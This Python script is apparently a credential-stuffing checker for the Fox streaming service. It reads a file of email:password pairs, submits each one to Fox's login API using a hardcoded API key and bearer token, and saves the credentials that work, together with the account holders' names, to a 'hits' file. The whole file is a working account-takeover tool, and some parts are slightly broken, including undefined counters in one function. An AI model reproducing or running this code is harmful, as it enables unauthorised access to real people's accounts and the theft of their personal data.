import requests
import json
import os

E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
ok=0
fa=0
logo=(f'''{G}
╭∩╮(Ο_Ο)╭∩╮
{B}Discord: {B}@waxgod''')
def msg(email,password):
 global ok,fa
 os.system('clear')
 print(logo)
 print(f'{B}ـ'*40)
 print(f'''{G}[√] Hit : {B}{ok}
{S}[×] Wrong : {E}{fa}''')
 print(f'{B}ـ'*40)
 print(f'{S}[+] {B}{email} {S}| {B}{password}')
 print(f'{B}ـ'*40)

def check(email, password):
    global ok, fa
    login_url = "https://api3.fox.com/v2.0/login"

    headers = {
        "content-type": "application/json",
        "Host": "api3.fox.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0",
        "Accept": "*/*",
        "Accept-Language": "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": "https://www.fox.com/",
        "Content-Type": "application/json",
        "X-Api-Key": "6E9S4bmcoNnZwVLOHywOv8PJEdu76cM9",
        "Authorization": "Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Ijg5REEwNkVEMjAxOCIsInR5cCI6IkpXVCJ9.eyJwaWQiOiJ3ZWI4YzhmMTNh5TJlMWFmMjgiLCJ1aWQiOiJkMlZpT0dNNFpqRXpZVFU0TURWalppMDBaV1EyTFdJeE9EY3RNakEwTURNNVpURmhaakk0Iiwic2lkIjoiODg5NWNlZTgtMzE2ZC00M2D1LWFmOTUtMWZiNjellZjUwZDBmIiwic2RjIjoidXMtZWFzdC0xIiwiYXR5cGUiOiJhbm9ueW1vdXMiLCJkdHlwZSI6IndlYiIsInV0eXBlIjoiZGV2aWNlSWQiLCJkaWQiOiI4YzhmMTNh5TJlMWFmMjgiLCJtdvBkaWQiOiIiLCJ2ZXIiOjIsImVudCI6e30sImV4cCI6MTY5MzI2NzAyNywianRpIjoiMTQ3MWE4MGEtZjM2NS00ZjYzLWJlMWYtNmNkMjQ2N2JkYmFmYyIsImlhdCI6MTY0NTk6PiJd00xsH5JdK090rCmuL2844akjFoUrH3OQTdswRo3006LJJ_CjtZIVeUOolkeJvCDKtbn9zZiYqbAl3j2Ye0iGVSiHDHmyZfm1bcZuHByFiQevGTNdQGqGHNFa_pi7v4RNhCSVYb0xvJ9cvIsFnuJ4TPUJ0KW6PiJFuxOc-l9Q5g",
        "Origin": "https://www.fox.com",
    }

    data = {
        "email": email,
        "password": password,
    }

    response = requests.post(login_url, headers=headers, json=data)

    try:
        response_json = response.json()
    except json.JSONDecodeError:
        response_json = {}

    first_name = response_json.get("firstName")
    last_name = response_json.get("lastName")
    has_social_login = response_json.get("hasSocialLogin")
    brand = response_json.get("brand")

    if first_name:
     ok += 1
     msg(email,password)
     with open("hits.txt", "a") as hit_file:
      hit_file.write(f"Combo:{email}:{password}\n")
      hit_file.write(f"First Name: {first_name}\n")
      hit_file.write(f"Last Name: {last_name}\n")
      hit_file.write(f"Has Social Login: {has_social_login}\n")
      hit_file.write(f"Brand: {brand}\n")
    else:
     fa += 1
     msg(email,password)
def update_console():
    print(f"\r{G}Hits: {hit_count} | {E}Fails: {fail_count}", end="")
combolist = input(f"\r{G}Enter Combo: ")
with open(combolist, "r") as file:
    for line in file:
        line = line.strip()
        if not ":" in line:
            continue
        email, password = line.split(":", 1) if ":" in line else (line, "")
        check(email, password)
